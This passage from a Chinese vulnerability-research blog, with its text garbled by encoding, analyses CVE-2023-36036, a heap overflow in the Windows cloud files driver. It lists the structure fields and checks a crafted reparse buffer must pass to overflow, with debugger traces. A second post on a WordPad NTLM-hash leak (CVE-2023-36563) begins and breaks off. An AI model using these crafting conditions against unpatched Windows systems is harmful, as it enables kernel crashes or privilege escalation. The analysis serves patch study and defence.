HSM_DATA_XXXX USHORT NumberOfElements; // Number of elements HSM_ELEMENT_INFO ElementInfos[1]; // Array of element infos. There is fixed maximal items for bitmap and reparse data } HSM_DATA, *PHSM_DATA; typedef struct _HSM_REPARSE_DATA { USHORT Flags; // Lower 8 bits is revision (must be 1 as of Windows 10 16299) // Flags: 0x8000 = Data needs to be decompressed by RtlCompressBuffer USHORT Length; // Length of the HSM_REPARSE_DATA structure (including \u0026#34;Flags\u0026#34; and \u0026#34;Length\u0026#34;) HSM_DATA FileData; // HSM data } HSM_REPARSE_DATA, *PHSM_REPARSE_DATA; å¯¹åº”åœ¨ REPARSE_DATA_BUFFERçš„åç§»å¦‚ä¸‹\n0:000\u0026gt; dt pa Local var @ 0xa8444fec08 Type _REPARSE_DATA_BUFFER* 0x000001e0`ef867690 +0x000 ReparseTag : 0x9000301a +0x004 ReparseDataLength : 0x4008 +0x006 Reserved : 0 +0x008 SymbolicLinkReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-SymbolicLinkReparseBuffer\u0026gt; +0x008 MountPointReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-MountPointReparseBuffer\u0026gt; +0x008 WimImageReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-WimImageReparseBuffer\u0026gt; +0x008 WofReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-WofReparseBuffer\u0026gt; +0x008 AppExecLinkReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-AppExecLinkReparseBuffer\u0026gt; +0x008 WcifsReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-WcifsReparseBuffer\u0026gt; +0x008 hsm_reparse_data : _HSM_REPARSE_DATA +0x008 GenericReparseBuffer : _REPARSE_DATA_BUFFER::\u0026lt;unnamed-tag\u0026gt;::\u0026lt;unnamed-type-GenericReparseBuffer\u0026gt; 0:000\u0026gt; dx -r1 (*((poc3!_HSM_REPARSE_DATA *)0x1e0ef867698)) (*((poc3!_HSM_REPARSE_DATA *)0x1e0ef867698)) [Type: _HSM_REPARSE_DATA] [+0x000] Flags : 0x8001 [Type: unsigned short] // 8 [+0x002] Length : 0x4008 [Type: unsigned short] // 10 [+0x004] FileData [Type: _HSM_DATA] // 12 0:000\u0026gt; dx -r1 (*((poc3!_HSM_DATA *)0x1e0ef86769c)) (*((poc3!_HSM_DATA *)0x1e0ef86769c)) [Type: _HSM_DATA] [+0x000] Magic : 0x70526546 [Type: unsigned long] // 12 [+0x004] Crc32 : 0x31e13b17 [Type: unsigned long] // 16 [+0x008] Length : 0x4004 [Type: unsigned long] // 20 [+0x00c] Flags : 0x2 [Type: unsigned short] // 24 [+0x00e] NumberOfElements : 0xb [Type: unsigned short] // 26 [+0x010] ElementInfos [Type: _HSM_ELEMENT_INFO [10) // 28 PoCæ„é€ \nå°†ç»“æ„ä½“å¯¼å…¥åˆ°idaä¸­ï¼Œåœ¨HsmpRpCommitNoLockä¸­é¦–å…ˆå¯¹ReparseTagè¿›è¡ŒéªŒè¯ï¼Œè€Œåå°†hsm_reparse_dataå’Œå¯¹åº”çš„é•¿åº¦å¯¼å…¥åˆ° HsmpRpValidateBufferå‡½æ•°ä¸­éªŒè¯ã€‚\nif ( (reparse_data_buffer-\u0026gt;ReparseTag \u0026amp; 0xFFFF0FFF) != dword_1C00235D0 ) { LODWORD(v9) = -1073688821; HsmDbgBreakOnStatus(3221278475i64); if ( WPP_GLOBAL_Control != (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) != 0 \u0026amp;\u0026amp; BYTE1(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026gt;= 2u ) { WPP_SF_qiqDDd( WPP_GLOBAL_Control-\u0026gt;AttachedDevice, 2i64, v30, a2, *(_QWORD *)(v5 + 32), v29, dword_1C00235D0, reparse_data_buffer-\u0026gt;ReparseTag); } goto LABEL_8; } ReparseDataLength = reparse_data_buffer-\u0026gt;ReparseDataLength; v9 = (unsigned int)HsmpRpValidateBuffer(\u0026amp;reparse_data_buffer-\u0026gt;DUMMYUNIONNAME.hsm_reparse_data, ReparseDataLength); åœ¨ HsmpRpValidateBufferå‡½æ•°ä¸­å¯¹HSM_DATAç»“æ„ä½“çš„ä¸€äº›å­—æ®µåšäº†å¦‚ä¸‹æ ¡éªŒã€‚\nreparse_data_buffer-\u0026gt;ReparseDataLength \u0026gt; 4 reparse_data_buffer-\u0026gt;hsm_reparse_data.Flags=1 reparse_data_buffer-\u0026gt;hsm_reparse_data.FileData.Magic = \u0026lsquo;pReF\u0026rsquo; reparse_data_buffer-\u0026gt;hsm_reparse_data.FileData.Flags = 2, å¹¶ä¸”reparse_data_buffer-\u0026gt;hsm_reparse_data.FileData.Crc32 == RtlComputeCrc32(0, (PUCHAR)\u0026amp;a1-\u0026gt;FileData.Length, v2 - 8 NumberOfElements ä¸ä¸º0ï¼Œä¸”æœ€å¤§ä¸º10ï¼Œæœ€åä¸€ä¸ªä»¥NONEç»“å°¾ ç‰¹åˆ«çš„ï¼Œä»å¦‚ä¸‹ä»£ç ä¸­å¯ä»¥çœ‹åˆ°å¯¹ElementInfos[0]å’ŒElementInfos[1]è¿›è¡Œäº†æ ¡éªŒï¼Œå®¹æ˜“å¾—å‡ºå¦‚ä¸‹æ¡ä»¶ï¼š\nNumberOfElements \u0026gt; 1 FileData.Length \u0026gt;= 0x20 `FileData.ElementInfos[1].Type == 0xA FileData.ElementInfos[1].Offset \u0026gt;= 8 * NumberOfElements + 16 \u0026amp;\u0026amp; FileData.ElementInfos[1].Offset \u0026lt; FileData.Length FileData.ElementInfos[1].Length == 4 FileData.ElementInfos[1].Length + FileData.ElementInfos[1].Offset \u0026lt; 65535 if ( (unsigned __int16)NumberOfElements \u0026gt; 1u \u0026amp;\u0026amp; (unsigned int)Length \u0026gt;= 0x20 \u0026amp;\u0026amp; (v22 = a1-\u0026gt;FileData.ElementInfos[1].Type, v22 \u0026lt; 0x12u) \u0026amp;\u0026amp; ((v23 = a1-\u0026gt;FileData.ElementInfos[1].Offset, !(_DWORD)v23) || v23 \u0026gt;= hsm_data_length) \u0026amp;\u0026amp; (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; (v24 = a1-\u0026gt;FileData.ElementInfos[1].Length, v24 \u0026lt;= (unsigned int)Length) \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026gt;= (unsigned int)v23 \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; v22 == 10 \u0026amp;\u0026amp; v24 == 4 ) { v5 = *(ULONG *)((char *)\u0026amp;p_FileData-\u0026gt;Magic + v23); IsReparseBufferSupported = 0; } else { IsReparseBufferSupported = 0xC0000225; } å¦‚ä¸‹ä»£ç å¯¹ElementInfos[2]è¿›è¡Œäº†æ ¡éªŒï¼Œæœ‰å¦‚ä¸‹ï¼š\nFileData.ElementInfos[2].Offset \u0026lt; FileData.Length FileData.ElementInfos[2].Length \u0026lt; FileData.Length FileData.ElementInfos[2].Type == 6 if ( (element_1_Data \u0026amp; 0x10) != 0 ) return IsReparseBufferSupported; v27 = a1-\u0026gt;FileData.Length; if ( v27 \u0026lt; 0x18 || (v28 = a1-\u0026gt;FileData.NumberOfElements, (unsigned __int16)v28 \u0026lt;= 2u) || v27 \u0026lt; 0x28 || (v29 = a1-\u0026gt;FileData.ElementInfos[2].Type, v29 \u0026gt;= 0x12u) || (v30 = a1-\u0026gt;FileData.ElementInfos[2].Offset, (_DWORD)v30) \u0026amp;\u0026amp; v30 \u0026lt; 8 * v28 + 16 || (unsigned int)v30 \u0026gt; v27 || (v31 = a1-\u0026gt;FileData.ElementInfos[2].Length, v31 \u0026gt; v27) || v31 + (unsigned int)v30 \u0026lt; (unsigned int)v30 || v31 + (unsigned int)v30 \u0026gt; v27 || v29 != 6 || (IsReparseBufferSupported = 0, v31 != 8) ) { IsReparseBufferSupported = 0xC0000225; } åé¢è¿˜æœ‰ä¸€å †æ ¡éªŒé€»è¾‘å°±ä¸è´´äº†ã€‚\nåœ¨ HsmpRpCommitNoLockä¸­å¯¹ HsmpRpValidateBufferè¿”å›å€¼åšäº†æ ¡éªŒï¼Œå¦‚æœIsReparseBufferSupportedä¸ä¸º0åˆ™ä¼šè¿›å…¥æŠ¥é”™é€»è¾‘ï¼Œè€Œåœ¨ HsmpRpValidateBuffer\nIsReparseBufferSupported = (unsigned int)HsmpRpValidateBuffer( \u0026amp;reparse_data_buffer-\u0026gt;DUMMYUNIONNAME.hsm_reparse_data, ReparseDataLength); HsmDbgBreakOnStatus(IsReparseBufferSupported); v32 = 0i64; if ( (IsReparseBufferSupported \u0026amp; 0x80000000) == 0i64 ) { ... } else { HsmDbgBreakOnCorruption(); if ( a4 == (_BYTE)v32 ) { if ( WPP_GLOBAL_Control != (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control \u0026amp;\u0026amp; (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) != 0 åœ¨HsmpRpValidateBufferä¸­å¯ä»¥çœ‹åˆ°å½“é€šè¿‡ç¬¬ä¸€æ¬¡æ ¡éªŒåï¼Œå¦‚æœElementInfos[1]çš„Data \u0026amp; 0x10 åˆ™ä¼šç›´æ¥è¿”å›ï¼Œæ­¤æ—¶IsReparseBufferSupported=0èƒ½é€šè¿‡æ ¡éªŒã€‚\nif ( (unsigned __int16)NumberOfElements \u0026gt; 1u \u0026amp;\u0026amp; (unsigned int)Length \u0026gt;= 0x20 \u0026amp;\u0026amp; (v22 = a1-\u0026gt;FileData.ElementInfos[1].Type, v22 \u0026lt; 0x12u) \u0026amp;\u0026amp; ((v23 = a1-\u0026gt;FileData.ElementInfos[1].Offset, !(_DWORD)v23) || v23 \u0026gt;= hsm_data_length) \u0026amp;\u0026amp; (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; (v24 = a1-\u0026gt;FileData.ElementInfos[1].Length, v24 \u0026lt;= (unsigned int)Length) \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026gt;= (unsigned int)v23 \u0026amp;\u0026amp; v24 + (unsigned int)v23 \u0026lt;= (unsigned int)Length \u0026amp;\u0026amp; v22 == 10 \u0026amp;\u0026amp; v24 == 4 ) { element_1_Data = *(ULONG *)((char *)\u0026amp;p_FileData-\u0026gt;Magic + v23); IsReparseBufferSupported = 0; } else { IsReparseBufferSupported = 0xC0000225; } HsmDbgBreakOnStatus(IsReparseBufferSupported); if ( (IsReparseBufferSupported \u0026amp; 0x80000000) != 0 ) { v25 = WPP_GLOBAL_Control; if ( WPP_GLOBAL_Control == (PDEVICE_OBJECT)\u0026amp;WPP_GLOBAL_Control || (HIDWORD(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026amp; 1) == 0 || BYTE1(WPP_GLOBAL_Control-\u0026gt;Timer) \u0026lt; 2u ) { return IsReparseBufferSupported; } v26 = 24i64; goto LABEL_163; } if ( (element_1_Data \u0026amp; 0x10) != 0 ) return IsReparseBufferSupported; é€šè¿‡æ„é€ ElementInfos[0]å’ŒElementInfos[1]å¯ä»¥é€šè¿‡HsmpRpValidateBufferæ ¡éªŒï¼Œè€Œåæ¼æ´è§¦å‘ç‚¹ä¼šè¯»å–ElementInfos[10]çš„æ•°æ®å’ŒLengthé€šè¿‡memcpyè¿›è¡Œæ‹·è´ï¼Œæ‰€ä»¥è¿˜éœ€è¦æ„é€ ElementInfos[10]çš„æ•°æ®ï¼Œå¹¶ä¸”ElementInfos[10]çš„Lengthéœ€è¦è¶…è¿‡ç›®æ ‡ç¼“å†²åŒºï¼Œç‰¹åˆ«çš„åœ¨è®¡ç®—CRC32åï¼Œéœ€è¦é€šè¿‡RtlCompressBufferå‹ç¼©ç›®æ ‡æ•°æ®ï¼Œå¹¶æ”¾å…¥åˆ°FileDataå¤„ã€‚\næ„é€ å¤šå¤§çš„ç¼“å†²åŒºï¼Ÿæ ¹æ®å‰é¢è¡¥ä¸åˆ†æï¼Œåœ¨è¡¥ä¸ä¸­é™åˆ¶äº†ReparseDataLength \u0026lt; 0x4000ï¼Œæ‰€ä»¥è¶…è¿‡å››åƒçš„éƒ¨åˆ†ä¼šé€ æˆæº¢å‡ºï¼Œå¦‚æœæƒ³æº¢å‡º8ä¸ªå­—èŠ‚åˆ™éœ€è¦æ„é€ 0x4008 + 8 = 0x4010ï¼Œä¾æ­¤ç±»æ¨ï¼Œåœ¨æ„é€ ç¼“å†²åŒºæ—¶ã€‚\nå¦‚ä½•å°†æ„é€ å¥½çš„æ•°æ®ä¼ é€’ç»™é©±åŠ¨å¹¶åœ¨ç›®æ ‡ä½ç½®è§¦å‘å‘¢ï¼Ÿåœ¨ç½‘ä¸ŠæŸ¥åˆ°æœ‰ç±»ä¼¼æ¼æ´åˆ†ææ–‡ç« \rWindowsäº‘æ–‡ä»¶è¿·ä½ è¿‡æ»¤å™¨é©±åŠ¨ç¨‹åºä¸­çš„ææƒæ¼æ´(CVE-2021-31969)ï¼Œä¸éš¾çœ‹å‡ºCVE-2021-31969ä¿®å¤å’Œæœ¬æ¬¡åˆ†æçš„æ¼æ´CVE-2023-36036ä¿®å¤ä½ç½®ç±»ä¼¼ï¼Œéƒ½å¯¹ReparseDataLengthè¿›è¡Œäº†åˆ¤æ–­ï¼Œæ‰€ä»¥æœ¬æ¬¡PoCç¼–å†™ä¹Ÿå¯ä»¥å€Ÿé‰´ã€‚\nåœ¨CVE-2021-31969åˆ†ææ–‡ç« ä¸­è´´å‡ºäº†éƒ¨åˆ†PoCï¼Œç»“åˆè¿™éƒ¨åˆ†PoCå’Œå‰é¢çš„ç»“æ„ä½“ï¼Œå†™å‡ºPoCä¹Ÿå°±ä¸éš¾äº†ã€‚\nåŠ¨æ€è°ƒè¯•\nåœ¨å¦‚ä¸‹ä¸¤ä¸ªä½ç½®ä¸‹æ–­ç‚¹\nbp cldflt!HsmpRpCommitNoLock bp cldflt!HsmpRpCommitNoLock+0x13de è¿è¡Œpocï¼Œå¯ä»¥çœ‹åˆ°å·²ç»è¿›å…¥HsmpRpCommitNoLockå‡½æ•°\n1: kd\u0026gt; g Breakpoint 0 hit cldflt!HsmpRpCommitNoLock: fffff804`6f6a1e88 48895c2420 mov qword ptr [rsp+20h],rbx ç»§ç»­è¿è¡Œï¼Œè§¦å‘ç¬¬äºŒä¸ªæ–­ç‚¹\n0: kd\u0026gt; g Breakpoint 1 hit cldflt!HsmpRpCommitNoLock+0x13de: fffff804`6f6a3266 e81571faff call cldflt!memcpy (fffff804`6f64a380) æ­¤æ—¶memmoveå·²ç»è¢«ä¼˜åŒ–ä¸ºmemcpyï¼Œè€Œè¦æ‹·è´çš„é•¿åº¦ä¸º0x3f94ï¼Œdstæ‰€åœ¨çš„å †å¤§å°ä¸º0x4000ï¼ŒdstæŒ‡å‘åç§»0x74å¤„ï¼Œæœ€å¤šæœ‰0x3f8cå¤§å°ï¼Œæ‰€ä»¥memcpyæ‹·è´æ—¶ä¼šè¶Šç•Œå†™å…¥8ä¸ªå­—èŠ‚ï¼Œé€ æˆå †æº¢å‡ºã€‚\n1: kd\u0026gt; rr8 r8=0000000000003f94 1: kd\u0026gt; !pool rcx Pool page ffffd980717f7074 region is Paged pool *ffffd980717f7000 : large page allocation, tag is HsRp, size is 0x4000 bytes Owning component : Unknown (update pooltag.txt) ç»§ç»­è¿è¡Œï¼Œåˆ™åœ¨memcpyå†…éƒ¨è§¦å‘å¼‚å¸¸ï¼Œå› ä¸ºå°è¯•å¾€æœªåˆ†é…çš„å†…å­˜é‡Œé¢å†™å…¥00\n0: kd\u0026gt; u cldflt!memcpy+0x165: fffff800`8186a4e5 0f2941f0 movaps xmmword ptr [rcx-10h],xmm0 0: kd\u0026gt; !pool rcx - 0x10 Pool page ffffe5028e4fa000 region is Paged pool ffffe5028e4fa000 is not a valid large pool allocation, checking large session pool... ffffe5028e4fa000 is not valid pool. Checking for freed (or corrupt) pool Address ffffe5028e4fa000 could not be read. It may be a freed, invalid or paged out page 0: kd\u0026gt; rxmm0 mm0=0000000000000000 å¯¹åº”ä»£ç ä¸º\nif ( v25 ) *(_OWORD *)(v15 + v25 - 16) = *(_OWORD *)(v15 + v25 - 16 + v13); *(__m128 *)(v15 - 0x10) = v14; ä»¥ä¸‹ä¸ºè°ƒç”¨æ ˆ\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffffb8a`8a45e4f8 fffff804`63717f82 nt!DbgBreakPointWithStatus 01 fffffb8a`8a45e500 fffff804`63717566 nt!KiBugCheckDebugBreak+0x12 02 fffffb8a`8a45e560 fffff804`635fd747 nt!KeBugCheck2+0x946 03 fffffb8a`8a45ec70 fffff804`63638f6f nt!KeBugCheckEx+0x107 04 fffffb8a`8a45ecb0 fffff804`63430730 nt!MiSystemFault+0x1de5ff 05 fffffb8a`8a45edb0 fffff804`6360d1d8 nt!MmAccessFault+0x400 06 fffffb8a`8a45ef50 fffff804`6f64a4e1 nt!KiPageFault+0x358 07 fffffb8a`8a45f0e8 fffff804`6f6a326b cldflt!memcpy+0x161 08 fffffb8a`8a45f0f0 fffff804`6f6a983b cldflt!HsmpRpCommitNoLock+0x13e3 09 fffffb8a`8a45f230 fffff804`6f66f0d7 cldflt!HsmiOpUpdatePlaceholderDirectory+0x57f 0a fffffb8a`8a45f320 fffff804`6f674b65 cldflt!HsmFltProcessUpdatePlaceholder+0x443 0b fffffb8a`8a45f3d0 fffff804`6f6a4504 cldflt!HsmFltProcessHSMControl+0x3d5 0c fffffb8a`8a45f500 fffff804`647264cc cldflt!HsmFltPreFILE_SYSTEM_CONTROL+0x6a4 0d fffffb8a`8a45f5a0 fffff804`64725f7a FLTMGR!FltpPerformPreCallbacksWorker+0x36c 0e fffffb8a`8a45f6c0 fffff804`64725021 FLTMGR!FltpPassThroughInternal+0xca 0f fffffb8a`8a45f710 fffff804`6475ae2f FLTMGR!FltpPassThrough+0x541 10 fffffb8a`8a45f7a0 fffff804`63410665 FLTMGR!FltpFsControl+0xbf 11 fffffb8a`8a45f800 fffff804`6380142c nt!IofCallDriver+0x55 12 fffffb8a`8a45f840 fffff804`63801081 nt!IopSynchronousServiceTail+0x34c 13 fffffb8a`8a45f8e0 fffff804`638d9ed6 nt!IopXxxControlFile+0xc71 14 fffffb8a`8a45fa20 fffff804`63610ef5 nt!NtFsControlFile+0x56 15 fffffb8a`8a45fa90 00007ff9`c648d704 nt!KiSystemServiceCopyEnd+0x25 16 00000056`01aff5b8 00007ff6`5e59167f ntdll!NtFsControlFile+0x14 17 00000056`01aff5c0 00000000`000001bc 0x00007ff6`5e59167f 18 00000056`01aff5c8 00000000`00000000 0x1bc PoCä¼šåœ¨è¿‡å‡ å¤©ä¸Šä¼ åˆ°GitHub\nhttps://github.com/Chestnuts4/POC å°ç»“ æœ¬æ¬¡æ¼æ´åˆ†æç¦»ä¸å¼€ä¸šå†…å‰è¾ˆé€†å‘å¾—å‡ºçš„_HSM_REPARSE_DATAç»“æ„ä½“ä¿¡æ¯ï¼Œè¿™ä¸ªç»“æ„ä½“å¾®è½¯æ²¡æœ‰å…¬å¼€çš„æ–‡æ¡£ï¼Œç›¸å…³èµ„æ–™ä¹Ÿå¾ˆå°‘ã€‚å¯ä»¥çœ‹åˆ°æ—©åœ¨2018å¹´ï¼Œå°±å·²ç»é€†å‘å‡ºäº†HSMç›¸å…³æ•°æ®ç»“æ„ä¿¡æ¯ã€‚ç›®å‰åªæœ‰è¿™ä¸€ä¸ªä»“åº“æœ‰ç›¸å…³ä¿¡æ¯ï¼Œå‘å‰è¾ˆè‡´æ•¬ã€‚\n/*****************************************************************************/ /* ReparseDataHsm.h Copyright (c) Ladislav Zezula 2018 */ /*---------------------------------------------------------------------------*/ /* Interface of the HSM reparse data structures */ /*---------------------------------------------------------------------------*/ /* Date Ver Who Comment */ /* -------- ---- --- ------- */ /* 06.09.18 1.00 Lad The first version of ReparseDataHsm.h */ /*****************************************************************************/ è¿™é‡Œå¼•ç”¨ä¸€ä¸‹å‰è¾ˆçš„ä¸»é¡µã€‚\nhttps://www.zezula.net/en/tools/main.html\næ•´ä½“æ¥çœ‹ï¼Œè¿™ä¸ªæ¼æ´åŸç†å’Œè§¦å‘æ–¹å¼è¾ƒä¸ºç®€å•ï¼Œåœ¨ä½¿ç”¨memcpyä¹‹å‰æ²¡æœ‰æ ¡éªŒé•¿åº¦ï¼Œè€Œä¿®å¤ä¹Ÿç®€å•ï¼Œå†è§£å‹ä¹‹å‰éªŒè¯é•¿åº¦æ˜¯å¦è¶…è¿‡0x4000ï¼Œè¶…è¿‡åˆ™è®¤ä¸ºæ•°æ®æœ‰é”™ï¼Œè¿›å…¥åˆ°é”™è¯¯é€»è¾‘ï¼Œä»è€Œåœ¨æºå¤´é˜»æ­¢äº†è§¦å‘æ¼æ´é€»è¾‘ã€‚\nåœ¨æ¼æ´ä¿®å¤å¤„åœ¨ä¿®å¤ä¸Šä¸ªæ•´æ•°ä¸‹æº¢çš„æ¼æ´æ—¶ï¼Œå¼€å‘äººå‘˜åªä¿®å¤å½“æ—¶çš„æ•´æ•°ä¸‹æº¢æ¼æ´ï¼Œæ²¡æœ‰å»è€ƒè™‘é•¿åº¦ä¼šä¸ä¼šè¿‡é•¿ï¼ŒæŸäº›ç¨‹åº¦æ¥è¯´è¿™ä¹Ÿæ˜¯å¼€å‘çš„ç²—å¿ƒå¤§æ„å¯¼è‡´äº†è¿™ä¸ªæ¼æ´ç•™åˆ°ç°åœ¨ã€‚\nåœ¨ç¼–å†™PoCå‚è€ƒäº†å…¶ä»–å®‰å…¨ç ”ç©¶å‘˜å·²æœ‰çš„åˆ†æã€‚\nè‡³äºExploitéƒ¨åˆ†è¿˜å¾—å†ç ”ç©¶ä¸€ä¸‹ã€‚\nå‚è€ƒé“¾æ¥\nhttps://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36036\nhttps://zhuanlan.zhihu.com/p/392194464\nhttps://github.com/microsoft/Windows-classic-samples/tree/main/Samples/CloudMirror\nhttps://learn.microsoft.com/en-us/windows/win32/cfapi/cloud-filter-reference\nhttps://learn.microsoft.com/zh-cn/windows/win32/cfapi/cloud-files-functions\nhttps://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/\nCreated at 2023-11-24T15:49:32+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/tags/","title":"Tags","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"æ¼æ´åˆ†æ","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/","title":"CVE-2023-36563 Wordpad Info Disclosure åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ wordpadåœ¨è§£ærtfæ–‡ä»¶åŒ…å«çš„oleå¯¹è±¡æ—¶ä¼šå°è¯•è®¿é—®Linked objectçš„TopicæŒ‡å‘çš„æ–‡ä»¶ï¼Œå¦‚æœTopicæ˜¯ä¸€ä¸ªUNCè·¯å¾„åˆ™ä¼šå°è¯•é€šè¿‡ç½‘ç»œè®¿é—®ï¼Œå¹¶å°è¯•ä½¿ç”¨NTLMè®¤è¯ï¼Œå¯¼è‡´æ³„éœ²NTLM hashã€‚\nå½±å“ç‰ˆæœ¬ ç•¥\nç¯å¢ƒæ­å»º windows 10 21h2 2023-09è¡¥ä¸ æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• åˆæ¬¡çœ‹è¿™ä¸ªæ¼æ´ï¼Œç›´è§‰ä¸Šå¾ˆç±»ä¼¼ä»Šå¹´4æœˆä»½çš„åœ¨é‡åˆ©ç”¨æ¼æ´\rCVE-2023-23397 outlook æƒé™æå‡æ¼æ´ï¼Œéƒ½æ˜¯æ³„éœ²NTLM hashï¼Œè¯¥æ¼æ´ä¹Ÿå¯èƒ½æ˜¯åœ¨æŸç§æ–‡ä»¶çš„æŸä¸ªå±æ€§ä½¿ç”¨äº†UNCè·¯å¾„ï¼Œä½¿å¾—wordpadåŠ è½½è¿œç¨‹èµ„æºï¼Œé€ æˆNTLM hashæ³„éœ²ã€‚\nè¡¥ä¸diff\ndiff wordpad.exeï¼Œå¯ä»¥çœ‹åˆ°ä¿®æ”¹äº†å¦‚ä¸‹å‡½æ•° åŒæ—¶åœ¨ä¿®å¤åçš„wordpad.exeä¸­æ–°å¢äº†QueryConvertOLELinkCallbackå‡½æ•°å’Œ_LoadImageWithWIC_0ï¼Œæ ¹æ®å¾®è½¯çš„å‡½æ•°å‘½åè§„åˆ™ï¼ŒQueryConvertOLELinkCallbackå¯èƒ½ç”¨äºæŸ¥è¯¢å¹¶è½¬æ¢OLEé“¾æ¥å›è°ƒå‡½æ•°ï¼Œæ¯”è¾ƒç¬¦åˆæˆ‘ä»¬çš„çŒœæµ‹ã€‚ é™„ä¸ŠAIè§£é‡Š å¯¹æ¯”å„ä¸ªä¿®æ”¹åçš„å‡½æ•°ï¼Œå¯ä»¥çœ‹å‡ºLoadImageResourceä¸ºåŠ è½½Imageçš„èµ„æºèŠ‚é‡Œé¢çš„èµ„æºï¼Œä¸æ˜¯å¾ˆç¬¦åˆæˆ‘ä»¬ä¹‹å‰çš„å‡è®¾ å›åˆ°è¡¥ä¸æ–°å¢çš„å‡½æ•°ä¸­ï¼Œå¯¹äºæ–°å¢çš„å‡½æ•°QueryConvertOLELineCallbackï¼Œå…¶åœ¨CRichEdit2View::OnCreateå‡½æ•°ä¸­è°ƒç”¨ï¼Œåœ¨diffä¸­å¯ä»¥çœ‹åˆ°è¡¥ä¸ä¸­å°†è¯¥å‡½æ•°ä½œä¸ºå›è°ƒå‡½æ•°æŒ‡é’ˆä¼ é€’ç»™äº†SendMessageWï¼Œç›®æ ‡çª—å£å¯ä»¥å–å‡ºè¿™ä¸ªå›è°ƒå‡½æ•°æŒ‡é’ˆå¹¶è°ƒç”¨\nåˆ†æåˆ°è¿™å¯ä»¥çŒœæµ‹æ˜¯wordpadæ‰“å¼€OLEå¯¹è±¡æ—¶ï¼Œå°†æŸä¸ªå±æ€§ä½œä¸ºUNCè·¯å¾„è¿›è¡Œäº†è§£æå¹¶è®¿é—®ï¼Œå¯¼è‡´NTLM hashæ³„éœ²ã€‚ oleå¯¹è±¡ç›¸å…³åŠŸèƒ½ç”±ole32.dllå®ç°ï¼Œdiff ole32.dllï¼Œä¸»è¦ä¿®æ”¹äº†å¦‚ä¸‹å‡½æ•°\nOLESTREAMToGenericObject wConvertOLESTREAMToIStorage OleConvertOLESTREAMToIStorage OleConvertOLESTREAMToIStorageEx æ–°å¢äº†å¦‚ä¸‹å‡½æ•°\nIsAppExcludedFromOLELinkConversionRegistrySetting CheckOLELinkConversionRegistrySetting FindStringInMultiString OleConvertOLESTREAMToIStorage2 OleConvertOLESTREAMToIStorageEx2 åœ¨OLESTREAMToGenericObjectå‡½æ•°diffä¸­å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†wordpadä¸­ä¼ é€’çš„å‡½æ•°æŒ‡é’ˆQueryConvertOLELineCallbackï¼Œå¹¶ä½¿ç”¨PrependUNCNameå°†szUNCæ·»åŠ UNCè·¯å¾„åèµ‹ç»™a2-\u0026gt;m_szTopicã€‚ å› æ­¤å¯ä»¥å¾—å‡ºç»“è®ºï¼šè¯¥æ¼æ´æ˜¯å°†oleå¯¹è±¡çš„m_szTopicä½œä¸ºUNCè·¯å¾„è¿›è¡Œè®¿é—®ã€‚\nè°·æ­Œæœç´¢OLESTREAMToGenericObjectï¼Œåœ¨å…¶ä»–å®‰å…¨ç ”ç©¶å‘˜å‘è¡¨çš„\rå…¶ä»–oleæ¼æ´åˆ†æä¸­çœ‹åˆ°äº†å¦‚ä¸‹\nOLEæ ¼å¼å¯ä»¥åœ¨\rOLDå¾®è½¯å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°ï¼ŒFormatIDæ ‡è¯†äº†oleå¯¹è±¡ç±»å‹ï¼Œæ ¹æ®ä¹‹å‰çš„åˆ†æå¯ä»¥çŸ¥é“æ˜¯LinkedObjectå¯¼è‡´äº†è¯¥æ¼æ´çš„äº§ç”Ÿã€‚ æ ¹æ®\rå¾®è½¯æ–‡æ¡£ï¼ŒLinkedObjectæ˜¯å•ç‹¬çš„æºæ–‡ä»¶ä¸­çš„å¯¹è±¡ã€‚å¦‚æœæºæ–‡ä»¶ä¸­çš„å¯¹è±¡å‘ç”Ÿæ›´æ”¹ï¼Œåˆ™æ–‡æ¡£ä¸­çš„å¯¹è±¡å°†è‡ªåŠ¨æ›´æ–°ä»¥åæ˜ è¿™äº›æ›´æ”¹ã€‚\nlinked object: An object that is inserted into a document and continues to exist in a separate source file. If the object in the source file changes, the object in the document is updated automatically to reflect those changes.\né€šè¿‡wordpadåˆ›å»ºä¸€ä¸ªrtfæ–‡ä»¶å¹¶åµŒå…¥oleå¯¹è±¡ï¼Œä½¿ç”¨ç¼–è¾‘å™¨æ‰“å¼€å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ï¼Œæ 